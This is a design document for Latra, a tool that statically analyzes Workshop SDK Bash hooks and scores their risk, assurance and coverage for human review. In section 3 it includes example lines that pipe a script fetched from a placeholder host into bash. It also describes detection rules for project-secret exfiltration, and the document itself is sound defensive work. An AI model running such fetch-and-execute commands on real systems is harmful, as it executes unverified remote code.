# Analysis, findings, and assessment design

## Purpose

This document defines how Latra turns Workshop SDK hook source into evidence-backed findings and an overall assessment.

The assessment is a **review-priority aid**, not a probability that an SDK is malicious and not a safety certification. A high score means that human review should be prioritized. A high assurance score means that positive, verifiable properties were observed; it does not cancel detected risk.

The text UI presents Assurance levels as `strong`, `moderate`, `limited`, and `none` to distinguish positive evidence from Risk severity. The JSON model retains the stable internal levels `high`, `medium`, `low`, and `info` for machine consumers.

The design has four goals:

- never execute SDK content during analysis;
- preserve source evidence from the Bash AST through the final report;
- evaluate risk and assurance independently to avoid one-sided judgments;
- produce deterministic results from the same inventory and rule database.

## Processing pipeline

```text
SDK files and hooks
        |
        v
mvdan Bash parser (AST)
        |
        v
Normalized operations and values
        |
        +----> operation graph and data-flow relations
        |
        v
Capabilities (behavioral facts)
        |
        v
Finding rules
        |
        +----> risk findings
        +----> assurance findings
        |
        v
Risk / Assurance / Coverage
        |
        v
Review Priority / Classification / Key Risks
```

Inventory information remains available throughout this pipeline. A finding therefore retains the SDK, hook, operation, source location, value, and resolution state that caused it.

## 1. Bash parsing

Latra parses each standard Workshop hook with `mvdan.cc/sh`. It does not run the hook, invoke commands, expand variables through a shell, or inspect runtime side effects.

Parsing produces one of the following states:

| State | Meaning |
| --- | --- |
| `parsed` | The complete hook was parsed. |
| `recovered` | An AST was recovered, but parsing was not complete. |
| failed or absent | A usable AST was not available. |

Recovered or failed parsing reduces analysis coverage and may create an analysis-gap risk finding. Latra does not treat an unparsed region as harmless.

## 2. Operation normalization

The parser-specific AST is converted into Latra's parser-independent operation model. The current operation kinds are:

| Operation | Meaning |
| --- | --- |
| `command-invocation` | A command or shell builtin invocation. |
| `assignment` | A shell variable assignment. |
| `pipeline` | A shell pipeline. |
| `redirect-read` | Input redirection. |
| `redirect-write` | Output redirection. |
| `command-substitution` | A command substitution such as `$(...)`. |
| `process-substitution` | A process substitution such as `<(...)`. |
| `function-declaration` | A shell function declaration. |
| `function-invocation` | An invocation of a known shell function. |
| `source` | Loading another shell file. |
| `eval` | Dynamic evaluation by the shell. |
| `control-flow` | A conditional, loop, or other control structure. |

Commands, arguments, inputs, and outputs are represented as structured values instead of being flattened immediately. Value parts include literals, quoted literals, variable references, command substitutions, arithmetic expansions, globs, and unknown expansions.

Each value has one of three resolution states:

| Resolution | Meaning |
| --- | --- |
| `Resolved` | Latra determined a single literal value. |
| `PartiallyResolved` | Some parts or a bounded set of candidates were determined. |
| `Unknown` | The value could not be resolved statically. |

Resolution is intentionally conservative. It affects finding confidence: uncertainty is retained rather than converted into a definitive claim.

The `Value` fields have distinct guarantees:

- `parts` preserves the observed shell structure, including known literal prefixes and suffixes around an unresolved expansion.
- `literal` is populated only for `Resolved` values and is the complete value, never a known fragment presented as the whole value.
- `candidates` is populated only when Latra has a bounded set of complete possible values. Known prefixes and suffixes are concatenated into every candidate.

Assignments to known variables and `${VAR:-default}` / `${VAR-default}` are resolved when the tracked assignment state is sufficient. An unassigned variable remains unknown because it may be inherited from the hook environment. Command substitutions, globs, and unbounded control-flow results retain uncertainty.

### Workshop hook context

Operations are also associated with the documented Workshop lifecycle context:

| Hook | Root | Project mounted | Interfaces active | State mounted |
| --- | ---: | ---: | ---: | ---: |
| `setup-base` | yes | no | no | no |
| `setup-project` | no | yes | yes | no |
| `check-health` | yes | yes | yes | no |
| `save-state` | yes | context-dependent | context-dependent | yes |
| `restore-state` | yes | yes | yes | yes |

This context is used by lifecycle and privilege-sensitive rules. The same command can have different review implications depending on the hook in which it runs.

## 3. Operation graph

Every operation receives a deterministic hook-local ID in preorder, such as `op-0001`. Nested operations retain their parent ID and their zero-based sequence within that parent.

Latra then creates the following relations:

| Relation | Meaning |
| --- | --- |
| `contains` | A structural parent contains a child operation. |
| `sequence` | One sibling operation appears after another. |
| `pipeline` | Standard output from one pipeline stage flows to the next stage's standard input. |
| `substitution-flow` | Output from a command or process substitution flows into its containing operation. |
| `variable-flow` | A later operation references a variable assigned by an earlier operation. |
| `redirect-flow` | Standard output from a producing command flows to an output redirect in the same shell statement. |

Variable flow is a conservative, lexical approximation. It does not claim to model every Bash control-flow or runtime scope behavior.

The graph enables findings that cannot be expressed reliably as a command-name match. For example, both of the following can connect a network source to a shell execution sink:

```bash
curl https://example.invalid/install.sh | bash

payload=$(curl https://example.invalid/install.sh)
printf '%s' "$payload" | bash
```

The first uses a pipeline relation. The second combines substitution, variable, and pipeline flow.

## 4. Capability mapping

Capabilities are behavioral facts inferred from normalized operations. They answer questions such as “does this operation access the network?”, “does it write persistent configuration?”, or “does it dynamically execute content?”

Capability definitions are embedded from `capabilityconfig/default/*.yaml` at build time. A capability records:

- the capability and definition rule IDs;
- its source operation kind and operation ID;
- the target value and its resolution;
- the source location.

A capability is **not** a finding, severity, or maliciousness judgment. Contextual finding rules decide whether the observed fact contributes risk or assurance. This separation allows the command database to describe behavior without baking policy into command recognition.

Sensitive file reads are classified using the embedded path database. Workshop runs `setup-project` with `/project` as its working directory, so its relative sensitive paths are project-sensitive. Other hooks start in the SDK hook directory even when the project is mounted; they require an absolute `/project` path, or a later resolved working-directory model, before Latra classifies the read as project-sensitive. User and system sensitive paths remain separate classes, while unresolved values with a recognizable sensitive suffix are retained as lower-confidence candidates. Template names such as `.env.example`, `.env.sample`, and `.env.template` are excluded before positive matching.

File inputs are extracted from known command operands, input redirections, `source`/`.` operations, and command-specific option values such as curl's `@file` syntax. The emitted capability preserves the operation ID, target value, resolution, and source location. Hook context remains available through the enclosing analysis result.

Project reads and writes are also retained as unscored observations. Relative paths in `setup-project` are normalized against `/project`; resolved `cd` operations update that working directory, and bounded branch candidates remain partially resolved. The raw shell value is preserved alongside the normalized path and candidates.

### Project-boundary flow

Project access alone is not a risk finding. Latra promotes it only when an explicit operation-graph flow crosses the project boundary:

- `risk.remote-content-to-project` requires `network-download` to reach `project-write` through a pipeline, substitution, variable, redirect, or same-operation flow. It is medium severity because downloading dependencies into a project can be expected SDK behavior.
- `risk.project-data-exfiltration` requires `project-read` to reach `external-send` while the project is mounted and network interfaces are active. It is high severity because repository content is demonstrably connected to an external transfer.

Explicit destinations from curl, wget, git clone, archive extraction, and patch commands are handled by the file-output command database. Implicit destinations are not guessed. Pipeline `stdin`/`stdout` markers and curl's `@-` standard-input marker are streams rather than filesystem paths and therefore never create project-access capabilities.

Both boundary findings retain source and sink evidence, including operation IDs, source locations, raw values, normalized project paths, and resolution. A disconnected download and write, or a disconnected project read and send, does not match.

### Sensitive-data flow

Project-secret exfiltration is not inferred from a sensitive read or network command in isolation. The finding engine requires `project-sensitive-file-read` to reach `external-send` through a pipeline, command-substitution containment, or variable-flow edge. It also handles a same-operation file upload where both capabilities belong to one command.

The matcher requires a context in which the project is mounted and interfaces are active. A disconnected sensitive read and external send do not form a finding. Evidence contains the source path and operation as well as the sink value and operation, so assessment highlights expose both ends of the flow.

The combined resolution is the least certain resolution across the source, traversed relations, and sink. This lowers confidence for partially resolved or unknown propagation without discarding the observed flow. A confirmed project-secret exfiltration finding is `critical`; the assessment model therefore applies the existing critical risk floor of 80 even when the family aggregation would otherwise be lower.

Because a project-sensitive read also carries the general `project-read` capability, the same flow could satisfy both exfiltration rules. Latra suppresses the general finding only when the SDK, hook, source path, and source/sink operations match the critical sensitive flow. A different non-sensitive source path remains an independent general exfiltration finding.

## 5. Finding generation

Finding definitions are embedded from `internal/findingconfig/default/*.yaml`. The database has an independent schema version and content version so that rule changes can be identified in reports.

Each rule defines:

- a stable finding ID;
- `risk`, `assurance`, or unscored `observation` kind;
- a family;
- severity for risk, strength for assurance, or neither for observation;
- confidence and weight;
- a matcher and optional hook context;
- explanatory text, remediation, limitations, and protected risks;

Hook-level rules may constrain `run-as-root`, `project-mounted`, `interfaces-active`, `state-mounted`, and `context-dependent`. Configured context fields use AND semantics. If required hook context is unavailable, the rule does not match; Latra does not infer a positive contextual finding from the hook name alone.

### Matcher types

The current engine supports matchers for:

- capabilities;
- path writes;
- unknown commands;
- parse status;
- unresolved SDKs and SDK diagnostics;
- all hooks parsed;
- all commands known;
- absence of specified capabilities;
- Store archive digest availability;
- complete file inventory;
- read-only health checks;
- relation-based source-to-sink flow, including bounded artifact and collection flow through temporary files;
- bounded same-hook function argument propagation and SDK-local include expansion;
- SDK-level state lifecycle flow from `save-state` writes to matching `restore-state` reads;
- ordered, same-Workshop composition from an SDK Project write to a later SDK execution of the exact artifact path;
- bounded static path-alias resolution for symbolic links created earlier in the same hook;
- explicit semantic coverage dimensions and classification gates for unresolved behavior;
- high-impact Project control-file modification, source deletion, executable creation, permission changes, and Git state rewrite.

Assurance based on absence is only emitted when analysis is complete enough to support that conclusion. For example, an unknown command prevents `all-commands-known` and may prevent an absence-based assurance finding.

### Evidence and confidence

No finding is emitted without evidence. Evidence can reference metadata, diagnostics, a capability, an operation, context, or a relation flow. It includes the relevant operation IDs, value, resolution, and source location where available. `location` identifies the containing operation or evidence origin, while optional `valueLocation` identifies the exact AST word that directly represents the displayed value. Expanded, normalized, inferred, derived, and ambiguous values do not receive a fabricated value location.

The rule defines an initial confidence. Evidence can lower, but never raise, that confidence. The effective confidence multiplier is:

| Confidence | Multiplier |
| --- | ---: |
| `high` | 1.00 |
| `medium` | 0.75 |
| `low` or unknown | 0.50 |

For a finding with configured weight `w`, the adjusted weight is:

```text
adjusted_weight = w * confidence_multiplier
```

Findings are deduplicated by rule, SDK, hook, and matcher evidence key. Distinct occurrences remain distinct findings when they have distinct evidence keys.

### Independent risk and assurance

Risk and assurance findings are scored on separate axes.

- Risk expresses review-relevant behavior or uncertainty.
- Assurance expresses positively observed and verifiable controls or analysis properties.

Assurance never subtracts from risk. An SDK may be both powerful and well controlled. Conversely, low observed risk with weak assurance can mean that there is too little evidence, rather than that the SDK is safe.

## 6. Risk and assurance scoring

### Diminishing aggregation

Repeated findings should increase a score without increasing it linearly without bound. Latra uses diminishing aggregation for weights `w1 ... wn`, each bounded to `0..100`:

```text
D(w1 ... wn) = 100 * (1 - product(1 - wi / 100))
```

Examples:

```text
D(25)         = 25
D(25, 25)     = 43.75
D(25 x 6)     = 82.20
```

All externally reported scores are rounded to the nearest integer after aggregation.

### Family aggregation and caps

Adjusted finding weights are first aggregated within each family. The family score is capped to prevent many findings of one kind from dominating every other signal:

```text
family_score = min(D(adjusted finding weights), family_cap)
axis_score   = D(family scores)
```

Risk family caps:

| Family | Cap |
| --- | ---: |
| `remote-execution`, `destructive`, `sensitive-data`, `data-exposure`, `lifecycle-misuse` | 95 |
| `analysis-gap` | 40 |
| `persistence` | 70 |
| other risk families | 85 |

Assurance family caps:

| Family | Cap |
| --- | ---: |
| `analysis-quality` | 60 |
| `lifecycle-conformance`, `reproducibility` | 20 |
| `least-privilege` | 50 |
| `scope-limitation` | 60 |
| other assurance families | 60 |

### Risk severity floor

Aggregation must not dilute the declared severity of the strongest risk finding. The final risk score is therefore:

```text
risk_score = max(axis_score, severity_floor(strongest risk finding))
```

| Severity | Floor |
| --- | ---: |
| `critical` | 80 |
| `high` | 50 |
| `medium` | 25 |
| `low` | 10 |
| `info` | 0 |

Risk levels use the same boundaries: `critical >= 80`, `high >= 50`, `medium >= 25`, `low > 0`, and otherwise `info`.

Assurance levels are `high >= 60`, `medium >= 30`, `low > 0`, and otherwise `info`. Assurance has no severity floor.

## 7. Coverage

Coverage expresses whether Latra had enough analyzable evidence to support the assessment. It is separate from assurance.

### Hook coverage

```text
hook_score = 100 * (parsed + 0.5 * recovered) / total_hooks
```

When an SDK has no hooks, the hook score is `100` because there are no hook sources left unparsed.

### Command coverage

Only `command-invocation` operations are counted:

```text
command_score = 100 * known_commands / total_commands
```

A command is:

- known when it is fully resolved and present in the embedded command database;
- unknown when it is fully resolved but absent from the database;
- unresolved when its name is not statically resolved.

When there are no command operations, the command score is `100`.

### Combined coverage

```text
base_coverage_score = round(0.6 * hook_score + 0.4 * command_score)
coverage_score = min(base_coverage_score, semantic_coverage_score)
```

Coverage is `sufficient` only when its score is at least `80` and no hook failed to parse. Otherwise it is `insufficient`.

### Semantic coverage

Semantic coverage reports `dataFlow`, `includedSources`, `functions`, `lifecycle`, `composition`, and `aliases` independently. Each dimension records applicable behavior, resolved behavior, and stable gap records. A critical gap deducts 25 points from semantic coverage and prevents a controlled classification. Examples include an unresolved include, an unexpanded function call, an external send with unlinked provenance, an unlinked state channel, unavailable SDK execution order, or a dynamic symbolic-link declaration.

Semantic coverage is an upper bound on the existing syntax/command score. Fully resolved semantics therefore leave existing scores unchanged, while a semantic gap cannot be hidden by complete parsing or a known command name.

An unresolved SDK or a resource limit affecting metadata, a standard hook, archive integrity, or complete archive traversal forces coverage to `0` and `insufficient`. Skipping only non-essential file content does not invalidate hook and command coverage.

File counts are reported as transparency metadata:

- inventoried entries;
- text files whose content was available for analysis;
- binary files represented only by metadata and digest.
- files whose content was skipped while path, size, and digest remained inventoried.

They are not a numeric term in the coverage formula. This avoids penalizing SDKs merely for containing many bundled binaries. A resource-limit failure affecting required analysis inputs still makes the assessment incomplete, while an explicit non-essential content skip remains visible without forcing coverage to zero.

## 8. Review priority and classification

Review Priority combines detected risk with lack of coverage:

```text
review_priority = max(risk_score, 100 - coverage_score)
```

Its level uses the risk-level thresholds. A low-risk but unanalyzable SDK therefore receives high review priority.

Classification is evaluated in this order:

| Condition | Classification |
| --- | --- |
| Critical semantic gap exists | `requires-semantic-review` |
| Coverage is insufficient | `insufficient-evidence` |
| Risk is at least 80 | `high-priority-review` |
| Risk is at least 50 and assurance is at least 60 | `powerful-but-controlled` |
| Risk is at least 50 | `high-priority-review` |
| Risk is at most 49 and assurance is at least 60 | `expected-and-controlled` |
| Otherwise | `weakly-controlled` |

This ordering is intentional:

- incomplete evidence takes precedence over an apparently low risk score;
- critical risk is never downgraded by high assurance;
- high risk plus high assurance is surfaced as powerful but controlled, rather than safe;
- assurance does not reduce Review Priority.

## 9. Project-level assessment

Latra calculates the same assessment for each SDK and for the entire scanned project.

The project score is not an average of SDK scores. All project findings are aggregated by family using the same formulas, and coverage counters are combined before coverage is recalculated. If any SDK is unresolved or a required analysis input is resource-limited, project coverage is incomplete.

This prevents a large number of low-risk SDKs from averaging away one high-risk SDK.

### Worked example

Assume a project has:

- six high-confidence unknown-command findings with weight `25` in `remote-execution`;
- one high-confidence persistence finding with weight `25` in `persistence`;
- sufficient coverage.

The scores are:

```text
remote-execution = D(25, 25, 25, 25, 25, 25) = 82.20 -> 82
persistence      = D(25)                       = 25
project risk     = D(82.20, 25)                = 86.65 -> 87
```

Review Priority is at least `87`, and the project is `high-priority-review`. Assurance findings may still be high, but do not reduce this value.

For a fully analyzed SDK with only one medium persistence finding of weight `25`, risk is `25`. If assurance is at least `60` and coverage is sufficient, the classification is `expected-and-controlled`, while the persistence finding remains visible for review.

A statically controlled `setup-base` write to a fully resolved `/etc/profile.d/*.sh` target is represented by `risk.profile-environment-write` with low severity and weight `10`. Low-risk content is restricted to declarative `NAME=...` or `export NAME=...` assignments, comments, and blank lines. Reading or sourcing a persistence-class path is not classified as a persistence write. A heredoc template may contain the Workshop-provided `SDK` variable because Workshop supplies it to every SDK hook; arbitrary variables and expansions remain unresolved. The generic medium persistence rule excludes the calibrated occurrence, so it is not counted twice. Remote content, unresolved non-Workshop values, arbitrary script statements, non-static file input, other hooks, `/etc/profile`, shell rc files, cron, and systemd paths remain generic persistence risk. Heredoc content is preserved as an operation value so this decision remains evidence-based.

## 10. Key Risks

`Key Risks` translates the aggregate score back into actionable evidence.

Risk findings are grouped by finding ID. For each group Latra reports:

- title and severity;
- a diminishing score calculated from all occurrences of that rule;
- occurrence count;
- every unique SDK, hook, source location, and value.

The displayed per-rule score does not apply the family cap because it explains the contribution of that specific rule. Key Risks are ordered by score descending, severity descending, and finding ID.

Text output uses locations that can be transferred directly to investigation commands:

```text
sdk=<sdk> file=<sdk-relative path>:<line>:<column> hook=<hook> value="<value>"
```

For example:

```text
sdk=go file=sdk/hooks/setup-base:1:11 hook=setup-base value="/etc/profile.d/go.sh"
```

The corresponding source can be inspected with:

```bash
latra hook go setup-base
latra file go sdk/hooks/setup-base
```

The compact Summary shows only high- and critical-risk finding IDs. Text Assessment lists Key Risks only under each SDK to avoid duplicating the same evidence at project and SDK levels. JSON retains both the project aggregation and per-SDK Key Risks, while verbose JSON retains complete findings and evidence.

## 11. Determinism and versioning

Latra keeps assessment output reproducible by:

- embedding capability and finding definitions at build time;
- assigning stable hook-local operation IDs;
- sorting relations, findings, family scores, Key Risks, scopes, and SDK assessments;
- excluding execution time and Go map iteration order from calculations;
- using fixed formulas and integer rounding rules.

Given the same inventory, embedded command/capability database, and finding database, the analysis and assessment are expected to be identical.

Changes to finding definitions or weights must update the finding database content version. Schema changes require a schema-version update. This makes score changes distinguishable from changes in the scanned SDK itself.

## 12. Limitations and non-goals

- Static analysis cannot prove the complete runtime behavior of arbitrary Bash.
- Latra does not execute hooks or downloaded content.
- Relation flow is conservative and is not a complete shell control-flow or taint-analysis engine.
- A known command means that Latra has a behavioral definition for it; it does not mean the invocation is safe.
- An unknown command creates an analysis gap; it is not by itself proof of malicious behavior.
- Archive digests establish artifact identity for the analyzed download, not publisher trust or source provenance.
- Scores are calibrated review signals, not probabilities, CVSS scores, or compatibility guarantees.
- External reputation services, AI judgments, and third-party trust feeds are outside the current assessment path.

These limitations are why Latra preserves findings, evidence, raw hook content, and investigation commands alongside the aggregate score.
